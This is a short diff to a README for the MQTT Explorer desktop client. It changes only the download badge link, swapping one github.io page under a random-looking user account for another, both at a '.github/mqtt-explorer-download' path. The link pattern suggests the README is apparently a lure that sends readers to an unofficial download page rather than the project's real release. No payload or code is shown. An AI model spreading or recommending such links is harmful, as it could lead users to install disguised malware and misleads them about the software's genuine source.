@@ -1,6 +1,6 @@
 # MQTT Explorer - Desktop MQTT Client for MQTT Topic Inspection
 
-[![GET MQTT Explorer](https://img.shields.io/badge/GET%20%E2%80%94%20MQTT%20Explorer-0078D6?style=for-the-badge&logoColor=white)](https://jessesawyerhmpb.github.io/.github/mqtt-explorer-download)
+[![GET MQTT Explorer](https://img.shields.io/badge/GET%20%E2%80%94%20MQTT%20Explorer-0078D6?style=for-the-badge&logoColor=white)](https://camdenreeddpyg.github.io/.github/mqtt-explorer-download)
 
 ## Explore MQTT Explorer for Broker Visibility
 
